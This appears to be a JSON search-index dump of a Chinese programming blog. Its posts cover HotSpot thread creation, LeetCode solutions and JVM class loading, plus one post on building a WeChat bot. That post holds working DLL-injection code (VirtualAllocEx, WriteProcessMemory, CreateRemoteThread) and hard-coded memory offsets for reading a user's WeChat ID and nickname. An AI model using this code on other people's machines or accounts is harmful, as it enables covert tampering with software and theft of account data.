1234567891011121314151617181920212223242526272829303132333435363738394041#include \"jni.h\"#include \"jvm.h\"#include \"java_lang_Thread.h\"#define THD \"Ljava/lang/Thread;\"#define OBJ \"Ljava/lang/Object;\"#define STE \"Ljava/lang/StackTraceElement;\"#define STR \"Ljava/lang/String;\"#define ARRAY_LENGTH(a) (sizeof(a)/sizeof(a[0]))static JNINativeMethod methods[] = &#123; &#123;\"start0\", \"()V\", (void *)&amp;JVM_StartThread&#125;, &#123;\"stop0\", \"(\" OBJ \")V\", (void *)&amp;JVM_StopThread&#125;, &#123;\"isAlive\", \"()Z\", (void *)&amp;JVM_IsThreadAlive&#125;, &#123;\"suspend0\", \"()V\", (void *)&amp;JVM_SuspendThread&#125;, &#123;\"resume0\", \"()V\", (void *)&amp;JVM_ResumeThread&#125;, &#123;\"setPriority0\", \"(I)V\", (void *)&amp;JVM_SetThreadPriority&#125;, &#123;\"yield\", \"()V\", (void *)&amp;JVM_Yield&#125;, &#123;\"sleep\", \"(J)V\", (void *)&amp;JVM_Sleep&#125;, &#123;\"currentThread\", \"()\" THD, (void *)&amp;JVM_CurrentThread&#125;, &#123;\"countStackFrames\", \"()I\", (void *)&amp;JVM_CountStackFrames&#125;, &#123;\"interrupt0\", \"()V\", (void *)&amp;JVM_Interrupt&#125;, &#123;\"isInterrupted\", \"(Z)Z\", (void *)&amp;JVM_IsInterrupted&#125;, &#123;\"holdsLock\", \"(\" OBJ \")Z\", (void *)&amp;JVM_HoldsLock&#125;, &#123;\"getThreads\", \"()[\" THD, (void *)&amp;JVM_GetAllThreads&#125;, &#123;\"dumpThreads\", \"([\" THD \")[[\" STE, (void *)&amp;JVM_DumpThreads&#125;, &#123;\"setNativeName\", \"(\" STR \")V\", (void *)&amp;JVM_SetNativeThreadName&#125;,&#125;;#undef THD#undef OBJ#undef STE#undef STRJNIEXPORT void JNICALLJava_java_lang_Thread_registerNatives(JNIEnv *env, jclass cls)&#123; (*env)-&gt;RegisterNatives(env, cls, methods, ARRAY_LENGTH(methods));&#125; 我们可以看到methods定义了所有的native方法。Java_java_lang_Thread_registerNatives恰好对应的是java.lang.Thread中的registerNatives()方法。 当执行t.start()的时候，发生了什么呢？ 我们知道在执行t.start()的时候，jdk代码中会去执行start0的native方法那么对应的就是JVM_StartThread。 我们找到JVM_StartThread openjdk-jdk8u-jdk8u\\hotspot\\src\\share\\vm\\prims\\jvm.h openjdk-jdk8u-jdk8u\\hotspot\\src\\share\\vm\\prims\\jvm.cpp 在C/C++中.h .hpp文件为头文件，可以理解为啥呢，Java中的接口文件（类似哈，请不要较真） .c .cpp为具体的实现文件。 在jvm.cpp找到JVM_ENTRY(void, JVM_StartThread(JNIEnv* env, jobject jthread))创建线程的入口。 其中第6步的new JavaThread在openjdk-jdk8u-jdk8u\\hotspot\\src\\share\\vm\\runtime\\thread.cpp JavaThread::JavaThread(ThreadFunction entry_point, size_t stack_sz) 在调用pthread_create的时候，这里涉及到具体的操作系统 12345678910linux:openjdk-jdk8u-jdk8u\\hotspot\\src\\os\\linux\\vm\\os_linux.cppwindows:openjdk-jdk8u-jdk8u\\hotspot\\src\\os\\windows\\vm\\os_windows.cppbsd:openjdk-jdk8u-jdk8u\\hotspot\\src\\os\\bsd\\vm\\os_bsd.cppaix:openjdk-jdk8u-jdk8u\\hotspot\\src\\os\\aix\\vm\\os_aix.cppsolaris:openjdk-jdk8u-jdk8u\\hotspot\\src\\os\\solaris\\vm\\os_solaris.cpp","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://xxzkid.github.io/tags/jvm/"}]},{"title":"leetcode 0005 最长回文子串","slug":"leetcode-0005","date":"2020-02-14T15:05:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/leetcode-0005/","link":"","permalink":"https://xxzkid.github.io/2020/leetcode-0005/","excerpt":"给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。 示例 1：123输入: &quot;babad&quot;输出: &quot;bab&quot;注意: &quot;aba&quot; 也是一个有效答案。 示例 2：12输入: &quot;cbbd&quot;输出: &quot;bb&quot;","text":"给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。 示例 1：123输入: &quot;babad&quot;输出: &quot;bab&quot;注意: &quot;aba&quot; 也是一个有效答案。 示例 2：12输入: &quot;cbbd&quot;输出: &quot;bb&quot; 解题： 首先我们要了解回文是什么意思，举个例子相信大家就知道了12上海自来水来自海上大波美人鱼人美波大 发现没有，字符串是对称的，我们可以以某一个字符为中心，分别比较左右字符是否相等，找到最大长度 1234567891011121314151617181920212223242526272829303132class Solution &#123; public String longestPalindrome(String s) &#123; if (s == null) &#123; throw new IllegalArgumentException(&quot;illegal argument&quot;); &#125; int length = s.length(); if (length == 0 || length == 1) &#123; return s; &#125; int start = 0, end = 0; for (int i = 0; i &lt; s.length(); i++) &#123; int len1 = centerExpand(s, i, i); int len2 = centerExpand(s, i, i + 1); int len = Math.max(len1, len2); if (len &gt; end - start) &#123; start = i - (len - 1) / 2; end = i + len / 2; &#125; &#125; return s.substring(start, end + 1); &#125; private int centerExpand(String s, int left, int right) &#123; int L = left, R = right, LEN = s.length(); while (L &gt;= 0 &amp;&amp; R &lt; LEN &amp;&amp; s.charAt(L) == s.charAt(R)) &#123; L--; R++; &#125; return R - L - 1; &#125;&#125; 后记：Manacher 算法 https://www.zhihu.com/question/37289584","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/categories/leetcode/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/tags/leetcode/"}]},{"title":"leetcode 0004 寻找两个有序数组的中位数","slug":"leetcode-0004","date":"2020-02-14T15:04:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/leetcode-0004/","link":"","permalink":"https://xxzkid.github.io/2020/leetcode-0004/","excerpt":"给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。 请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。","text":"给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。 请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。示例 1:1234nums1 = [1, 3]nums2 = [2]则中位数是 2.0 示例 2:1234nums1 = [1, 2]nums2 = [3, 4]则中位数是 (2 + 3)/2 = 2.5 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586/*解题思路：由于这两个数组都是有序数组，如果我们从下标为i的地方把nums1数组分为两半，左边的数肯定比nums1[i]小，右边比nums2[i]大同理把nums2数组从下标为j的地方分为两半left | rightnums1[0], nums1[1], ..., nums1[i-1] | nums1[i], nums1[i+1], ..., nums1[m-1]nums2[0], nums2[1], ..., nums2[j-1] | nums2[j], nums2[j+1], ..., nums2[n-1]那只要满足两个条件，我们就可以顺利找到中位数1. len(left)==len(right) 相当于 i+j=m-i+n-j2. min(right) &gt;= max(left) 相当于 nums2[j] &gt;= nums2[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]对于第一个条件:我们可以推出j = (m + n) / 2 - i，当i的值确定，j的值就确定了，也就是说我们只要把i的值确定下来满足第二个条件就行对于第二个条件:我们需要满足 nums2[j] &gt;= nums1[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]，不满足的条件有两种:1. nums2[j] &lt; nums1[i-1]，说明i的值太大了，你想想nums1[i]的值肯定大于nums1[i-1]，如果i继续加大，条件永远无法满足，所以要减小i2. nums1[i] &lt; nums2[j-1]，说明i的值太小了，需要加大i的值最后我们再看看满足条件nums2[j] &gt;= nums1[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]是怎么得到中位max(left) = max(nums1[i-1], nums2[j-1])min(right) = min(nums1[i], nums1[j])如果数组之和是偶数，中位数 = (max(left) + min(right)) / 2如果数组之和是奇数，中位数 = max(left)或者min(right)，那取哪个呢，哪边多一个就取哪边我们可以将j = (m + n) / 2 - i改为j = (m + n + 1) / 2 - i来保证j的值大些，从而保证len(left) &gt; left(right)也可以将j = (m + n) / 2 - i改为j = (m + n - 1) / 2 - i来保证j的值小些，从而保证len(right) &gt; left(left)最后就是一些特殊情况了:首先由于j是由i决定的，j = (m + n) / 2 - i, i的取值范围是0到m，也就是说j可能的值是(n - m) / 2 到(m + n) / 2，由于j不能为负，那么反推m &lt;= n特殊处理:如果i == 0或者i == m时，nums1数组有一边是没有值的同理j == 0或者j == n时，nums2数组有一边也是没有值的*/class Solution &#123; public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123; if (nums1 == null &amp;&amp; nums2 == null) &#123; throw new IllegalArgumentException(&quot;nums1 and nums2 is null&quot;); &#125; int m = nums1.length; int n = nums2.length; // 保证 m &lt;= n if (m &gt; n) &#123; int[] temp = nums1; nums1 = nums2; nums2 = temp; int tmp = m; m = n; n = tmp; &#125; int iMin = 0, iMax = m; //保证len(left) &gt; len(right) int halfLen = (m + n + 1) / 2; while (iMin &lt;= iMax) &#123; int i = (iMin + iMax) &gt;&gt;&gt; 1; int j = halfLen - i; // i的值太大，这里注意i的值不断减小有可能i变为0，j变为n，必须保证大于0，j也必须小于n if (i &gt; iMin &amp;&amp; nums2[j] &lt; nums1[i - 1]) &#123; iMax = i - 1; &#125; else if (i &lt; iMax &amp;&amp; nums1[i] &lt; nums2[j - 1]) &#123; // i 的值太小 iMin = i + 1; &#125; else &#123; // i的值刚好 int maxLeft = 0; // 特殊情况i == 0，数组nums1的left为空，只能取nums2的left的最大值 if (i == 0) &#123; maxLeft = nums2[j - 1]; &#125; else if (j == 0) &#123; maxLeft = nums1[i - 1]; &#125; else &#123; maxLeft = Math.max(nums1[i - 1], nums2[j - 1]); &#125; if ((m + n) % 2 == 1) &#123; return maxLeft; &#125; int minRight = 0; if (i == m) &#123; minRight = nums2[j]; &#125; else if (j == n) &#123; minRight = nums1[i]; &#125; else &#123; minRight = Math.min(nums2[j], nums1[i]); &#125; return (maxLeft + minRight) / 2.0; &#125; &#125; return 0.0; &#125;&#125;","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/categories/leetcode/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/tags/leetcode/"}]},{"title":"leetcode 0003 无重复字符的最长子串","slug":"leetcode-0003","date":"2020-02-14T15:03:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/leetcode-0003/","link":"","permalink":"https://xxzkid.github.io/2020/leetcode-0003/","excerpt":"给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。","text":"给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。示例 1:123输入: &quot;abcabcbb&quot;输出: 3 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。 示例 2:123输入: &quot;bbbbb&quot;输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。 示例 3:1234输入: &quot;pwwkew&quot;输出: 3解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。 解题：12345678910111213141516171819202122232425class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; int len = s.length(); int index = 0; int max = 0; while (index &lt; len) &#123; Map&lt;Character, Object&gt; map = new HashMap&lt;&gt;(); int currMax = 0; for (int i = index; i &lt; len; i++) &#123; char c = s.charAt(i); if (map.containsKey(c)) &#123; break; &#125; else &#123; map.put(c, null); currMax++; &#125; &#125; if (currMax &gt; max) &#123; max = currMax; &#125; index++; &#125; return max; &#125;&#125;","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/categories/leetcode/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/tags/leetcode/"}]},{"title":"leetcode 0002 两数相加","slug":"leetcode-0002","date":"2020-02-14T15:02:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/leetcode-0002/","link":"","permalink":"https://xxzkid.github.io/2020/leetcode-0002/","excerpt":"给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。 如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。 您可以假设除了数字 0 之外，这两个数都不会以 0 开头。","text":"给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。 如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。 您可以假设除了数字 0 之外，这两个数都不会以 0 开头。示例：123输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 0 -&gt; 8原因：342 + 465 = 807 解题： 123456789101112131415161718192021222324252627282930/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode root = new ListNode(0); ListNode cursor = root; int carry = 0; while(l1 != null || l2 != null || carry != 0) &#123; int l1Val = l1 != null ? l1.val : 0; int l2Val = l2 != null ? l2.val : 0; int sumVal = l1Val + l2Val + carry; carry = sumVal / 10; ListNode sumNode = new ListNode(sumVal % 10); cursor.next = sumNode; cursor = sumNode; if(l1 != null) l1 = l1.next; if(l2 != null) l2 = l2.next; &#125; return root.next; &#125;&#125; 先把两个链表转成数字，然后相加，注意溢出（BigInteger） 1234567891011121314151617181920212223242526272829303132333435363738import java.math.BigInteger;/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; StringBuilder sb1 = new StringBuilder().append(l1.val); ListNode temp = l1; while (temp.next != null) &#123; temp = temp.next; sb1.append(temp.val); &#125; BigInteger i1 = new BigInteger(sb1.reverse().toString()); StringBuilder sb2 = new StringBuilder().append(l2.val); temp = l2; while (temp.next != null) &#123; temp = temp.next; sb2.append(temp.val); &#125; BigInteger i2 = new BigInteger(sb2.reverse().toString()); BigInteger sum = i1.add(i2); String sumStr = sum.toString(); ListNode result = new ListNode(Integer.parseInt(sumStr.charAt(sumStr.length() - 1) + &quot;&quot;)); ListNode tempResult = result; for (int i = sumStr.length() - 2; i &gt;= 0; i--) &#123; tempResult.next = new ListNode(Integer.parseInt(sumStr.charAt(i) + &quot;&quot;)); tempResult = tempResult.next; &#125; return result; &#125;&#125;","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/categories/leetcode/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/tags/leetcode/"}]},{"title":"leetcode 0001 两数之和","slug":"leetcode-0001","date":"2020-02-14T15:01:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/leetcode-0001/","link":"","permalink":"https://xxzkid.github.io/2020/leetcode-0001/","excerpt":"给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。","text":"给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 示例: 1234给定 nums = [2, 7, 11, 15], target = 9因为 nums[0] + nums[1] = 2 + 7 = 9所以返回 [0, 1] 解题： 这道题目只能暴力破解，匹配两个数相加，然后得出索引 12345678910111213class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; int len = nums.length; for (int i = 0; i &lt; len; i++) &#123; for (int j = i + 1; j &lt; len; j++) &#123; if (nums[i] + nums[j] == target) &#123; return new int[]&#123;i, j&#125;; &#125; &#125; &#125; return new int[]&#123;&#125;; &#125;&#125;","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/categories/leetcode/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"leetcode","slug":"leetcode","permalink":"https://xxzkid.github.io/tags/leetcode/"}]},{"title":"PC微信助手","slug":"pcwechat_helper","date":"2020-02-10T22:38:21.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/pcwechat_helper/","link":"","permalink":"https://xxzkid.github.io/2020/pcwechat_helper/","excerpt":"注入dll到微信0x0 首先要打开微信进程","text":"注入dll到微信0x0 首先要打开微信进程 12345678910111213141516wchar_t wxPath[] = L\"C:\\\\Program Files (x86)\\\\Tencent\\\\WeChat\\\\WeChat.exe\";STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFORMATION pi = &#123; 0 &#125;;ZeroMemory(&amp;si, sizeof(si));si.cb = sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = SW_SHOW;// 打开进程BOOL bCp = CreateProcess(NULL, wxPath, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi);if (bCp == 0)&#123; MessageBox(NULL, L\"启动微信失败\", L\"错误\", 0); return;&#125; 0x1 获取自己编写的dll写入到微信12345678910111213141516// 获取进程IDDWORD processID = pi.dwProcessId;// 打开进程HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);// 获取自己的dll路径string dllPath = GetDllPath();// 申请内存LPVOID dllBuffer = VirtualAllocEx(process, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);// 写入dll路径BOOL bWp = WriteProcessMemory(process, dllBuffer, dllPath.c_str(), MAX_PATH, NULL);if (bWp == 0)&#123; MessageBox(NULL, L\"写入dll路径失败\", L\"错误\", 0); return;&#125; 0x2 加载dll，创建远程线程123456789101112// 获取LoadLibrary()函数FARPROC proc = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryA\");// 创建远程线程HANDLE hThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)proc, dllBuffer, 0, NULL);if (hThread == NULL) &#123; MessageBox(NULL, L\"创建线程失败\", L\"错误\", MB_OK); return;&#125;WaitForSingleObject(hThread, INFINITE);CloseHandle(hThread);CloseHandle(process); 0x3 写入dll完成后，自己的dll就可以操作微信任意内存了获取个人信息 1234567891011121314DWORD GetWeChatWinAddr()&#123; if (weChatWinDllAddr == 0) &#123; weChatWinDllAddr = (DWORD) LoadLibrary(L\"WeChatWin.dll\"); &#125; return weChatWinDllAddr;&#125;// 2.7.1.88DWORD base = GetWeChatWinAddr();char* wxid = (char*) (base + 0x1397440); // 微信号char* nickname = (char*) (base + 0x13972DC); // 昵称char* head = (char*) (*(DWORD*)(base + 0x13975A4)); // 头像 0x4 成品展示","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"https://xxzkid.github.io/tags/c-c/"},{"name":"微信","slug":"微信","permalink":"https://xxzkid.github.io/tags/微信/"},{"name":"PC微信","slug":"PC微信","permalink":"https://xxzkid.github.io/tags/PC微信/"},{"name":"微信机器人","slug":"微信机器人","permalink":"https://xxzkid.github.io/tags/微信机器人/"}]},{"title":"深入理解JVM","slug":"深入理解JVM","date":"2019-06-30T14:40:52.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2019/深入理解JVM/","link":"","permalink":"https://xxzkid.github.io/2019/深入理解JVM/","excerpt":"类的加载，连接与初始化 加载：查找并加载类的二进制 连接 验证：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转为直接引用","text":"类的加载，连接与初始化 加载：查找并加载类的二进制 连接 验证：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转为直接引用 初始化：为类的静态变量赋于正确的初始值 Java程序对类的使用方式可以分为两种 主动使用 被动使用 所有的Java虚拟机实现必须在每个类或接口被Java程序“首次主动使用”时才初始化它们 主动使用 创建类的实例 访问某个类或接口的静态变量，或者对该静态变量赋值‘ 调用类的静态方法 反射（如Class.forName(“com.test.Test”)） 初始化一个类的子类 Java虚拟机启动时被标明为启动类的类（如执行 java Test） JDK1.7开始提供的动态语言支持：java.lang.invoke.MethodHandle实例的解析结果REF_getStatic，REF_putStatic，REF_invokeStatic句柄对应的类没有初始化，则初始化 除了上述7种情形，其他使用Java类的方式都被看作被动使用，不会导致类的初始化。 类的加载类的加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时的数据区内，然后在内存中创建一个java.lang.Class对象（规范并未说明Class对象位于哪里，HotSpot虚拟机将其放在了方法区中）用来防撞类在方法区的数据结构。 类加载器 Java虚拟机自带的类加载器 根类加载器（Bootstrap）从系统属性sun.boot.class.path指定的目录加载类(jar, class)，它并没有继承ClassLoader 扩展类加载器（Extension）它的父加载器为根类加载器，它从系统属性java.ext.dirs指定的目录加载类库，或者从JDK的安装目录的jre/lib/ext目录加载类库（即jar） 系统（应用）类加载器（System/App）它的父加载器为扩展类加载器，它从环境变量classpath或系统属性java.class.path指定的目录加载类(jar, class)，它是用户自定义加载器的默认父加载器，系统类加载器是纯Java类，是java.lang.ClassLoader类的子类。 用户自定义的类加载器 java.lang.ClassLoader的子类 用户可以定制类的加载方式 类加载器会把类加载到Java虚拟机中，从JDK 1.2版本开始，类的加载过程采用双亲委托机制，这种机制能更好的保证Java平台的安全，在此委托机制中，除了Java虚拟机自带的根类加载器外，其余的加载器都有且只有一个父加载器，当Java程序请求加载器loader1加载Sample类时，loader1首先委托自己的父加载器去加载Sample类，若如加载器能加载，则由父加载器完成加载任务，否则才由加载器loader1本身加载Sample类。 类的初始化 步骤 假如这个类还没有被加载和连接，那就先进行加载和连接 假如类存在直接父类，并且这个父类还没有被初始化，那就先初始化直接父类 假如类中存在初始化语句，那就依次执行这些初始化语句 类的初始化时机 当Java虚拟机初始化一个实例时，要求它所有的父类都已经初始化，但是这条规则并不适用于接口 在初始化一个类时，并不会先初始化它所实现的接口 在初始化一个接口时，并不会先初始化它的父接口 因此，一个父接口并不会因为它的子接口或者实现类的初始化而初始化，只有当程序首次使用特定接口的静态变量时，才会导致该接口的初始化。 调用ClassLoader类的loadClass方法加载一个类，并不是对类的主动使用，不会导致类的初始化。 获取ClassLoader的途径获取当前类的ClassLoader clazz.getClassLoader() 获取当前线程上下文的ClassLoader Thread.currentThread().getContextClassLoader() 获取系统的ClassLoader ClassLoader.getSystemClassLoader() 获取调用者的ClassLoader sun.reflect.Relection.getCallerClass().getClassLoader() 类加载器的双亲委托机制1234ClassLoader loader1 = new MyClassLoader();// 参数loader1将作为loader2的父加载器ClassLoader loader2 = new MyClassLoader(loader1); 双亲委托机制的优点是能够提高软件系统的安全性。因此在此机制下，用户自定义的类加载器不可能加载应该由父加载器加载的可靠类，从而防止不可靠甚至恶意的代码替代父加载器加载的可靠代码，例如：java.lang.Object 类总是由根类加载器加载，其他任何用户自定义的类加载器都不可能加载包含有恶意代码的java.lang.Object类 命名空间 每个类加载器都有自己的命名空间，命名空间由该加载器及所有父加载器所加载的类组成 在同一个命名空间中，不会出现类的完成名字（包括类的包名）相同的两个类 在不同的命名空间中，有可能会出现类的全限定名（包括类的包名）相同的两个类 java.lang.ClassCastException: com.test.Test cannot be cast to com.test.Test 类的卸载由用户自定义的类加载器所加载的类是可以被卸载的 SPI (Service Interface Provider) 例子：JDBC 字节码12javap -c com.test.Test1javap -verbose com.test.Test1 使用javap -verbose命令分析一个字节码时，将会分析字节码文件的魔数，版本号，常量池，类信息，类的构造方法，类中的方法信息，类变量与成员变量等信息。 魔数：所有的.class字节码文件的前4个字节都是魔数，魔数值为固定值：0xCAFEBABE 魔数之后的4个字节时版本信息，前两个字节时minor version（次版本号），后两个字节时major version（主版本号）这里的版本号为00 00 00 34 换算成十进制，表示次版本号为0，主版本号为52. 所以该文件的版本号为1.8.0，可以通过java -version来验证。 常量池（constant pool）：紧接着主版本号之后就是常量池的入口，一个Java类中定义的很多信息都是常量池来维护和描述的，可以将常量池看作是Class文件的资源仓库，比如说Java类中定义的方法与变量信息，都是存在在常量池中，常量池中主要存储两类常量：字面量与符号引用，字面量如文本字符串，Java中声明为final的常量等，而符号引用和接口的全限定名，字段的名称和描述，方法的名称和描述符等。 常量池的总体结构：Java类所对应的常量池主要由常量数量和常量池数组这两个部分组成。常量池数量紧跟在主版本号之后，占2个字节；常量池数组紧跟在常量池数量之后。常量池数组与一般的数组不同的是，常量池数组中不同的元素的类型，结构都是不同的。长度当然也就不同；但是，每一种元素的第一个数据都是一个u1类型，该字节是个标志位，占1个字节，JVM在解析常量池时，会根据这个u1类型来获取元素的具体类型。值得注意的是，常量池数组中元素的个数 = 常量池数 - 1（其中0暂时不实用）。目的是满足某些常量池索引值的数据在特定情况下需要表达「不引用任何一个常量池」；根本原因在于，索引值为0也是一个常量（保留常量），只不过它不位于常量表中，这个常量对应null值，常量池的索引从1而非0开始。 在JVM规范中，每个变量/字段都有描述信息，描述信息主要的作用是描述字段的数据类型，方法的参数列表（包括数量，类型与顺序），根据描述符规则，基本数据类型和代表无返回值的void类型都用一个大写字符来表示，对象类型则使用字符L加对象全限定名称来表示，为了压缩字节码文件的体积，对于基本数据类型，JVM都只使用一个大写字母表示，如下所示：B - byte, C - char, D - double, F - float, I = int, J = long, S - short, Z - boolean, V - void, L - 对象类型，如Ljava/lang/String; 对于数组类型来说，每一个维度使用一个前置[来表示，如int[]被记录为[I, String[][]被记录为[[java/lang/String; 用描述符来描述方法的时候，按照先参数列表，后返回值的顺序来描述，参数列表按照参数的严格顺序放在一组()之内，如方法：String getPersonByIdAndName(int id, String name)的描述符为：([I,Ljava/lang/String;)Ljava/lang/String; 完整的Java字节码结构123456789101112131415161718ClassFile &#123; u4 magic; // 魔数 u2 minor_version; // 次版本号 u2 major_version; // 主版本号 u2 constant_pool_count; // 常量池个数 constant_pool constant_pool_count - 1; // 常量池表 u2 access_flag; // 类的访问控制权限 u2 this_class; // 类名 u2 super_class; // 父类名 u2 interfaces_count; // 接口数量 u2 interfaces; // 接口个数 u2 fields_count; // 字段个数 field_info fields; // 字段表 u2 methods_count; // 方法个数 method_info methods; // 方法表 u2 attributes_count; // 附加属性的个数 attribute_info attributes; // 附加属性表&#125; u1, u2, u4, u8 表示1个字节，2个字节，4个字节，8个字节 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384javap -verbose org.xxz.Test1 Classfile /Users/tt/IdeaProjects/demo/target/classes/org/xxz/Test1.class Last modified 2019-6-7; size 455 bytes MD5 checksum cb0d025ecc8eb40b573008dd290ac668 Compiled from \"Test1.java\"public class org.xxz.Test1 minor version: 0 major version: 52 flags: ACC_PUBLIC, ACC_SUPERConstant pool: #1 = Methodref #4.#20 // java/lang/Object.\"&lt;init&gt;\":()V #2 = Fieldref #3.#21 // org/xxz/Test1.a:I #3 = Class #22 // org/xxz/Test1 #4 = Class #23 // java/lang/Object #5 = Utf8 a #6 = Utf8 I #7 = Utf8 &lt;init&gt; #8 = Utf8 ()V #9 = Utf8 Code #10 = Utf8 LineNumberTable #11 = Utf8 LocalVariableTable #12 = Utf8 this #13 = Utf8 Lorg/xxz/Test1; #14 = Utf8 getA #15 = Utf8 ()I #16 = Utf8 setA #17 = Utf8 (I)V #18 = Utf8 SourceFile #19 = Utf8 Test1.java #20 = NameAndType #7:#8 // \"&lt;init&gt;\":()V #21 = NameAndType #5:#6 // a:I #22 = Utf8 org/xxz/Test1 #23 = Utf8 java/lang/Object&#123; public org.xxz.Test1(); descriptor: ()V flags: ACC_PUBLIC Code: stack=2, locals=1, args_size=1 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"&lt;init&gt;\":()V 4: aload_0 5: iconst_1 6: putfield #2 // Field a:I 9: return LineNumberTable: line 6: 0 line 8: 4 LocalVariableTable: Start Length Slot Name Signature 0 10 0 this Lorg/xxz/Test1; public int getA(); descriptor: ()I flags: ACC_PUBLIC Code: stack=1, locals=1, args_size=1 0: aload_0 1: getfield #2 // Field a:I 4: ireturn LineNumberTable: line 11: 0 LocalVariableTable: Start Length Slot Name Signature 0 5 0 this Lorg/xxz/Test1; public void setA(int); descriptor: (I)V flags: ACC_PUBLIC Code: stack=2, locals=2, args_size=2 0: aload_0 1: iload_1 2: putfield #2 // Field a:I 5: return LineNumberTable: line 15: 0 line 16: 5 LocalVariableTable: Start Length Slot Name Signature 0 6 0 this Lorg/xxz/Test1; 0 6 1 a I&#125;SourceFile: \"Test1.java\" 常量池表，访问控制权限表 jclasslib 基于栈的指令集与基于寄存器的指令集之间的关系： JVM执行指令时采取的方式是基于栈的指令集 基于栈的指令集主要的操作由入栈和出栈 基于栈的指令集的优势在于它可以在不同的平台之间移植，而基于寄存器的指令集是与硬件紧密关联的，无法做到可移植 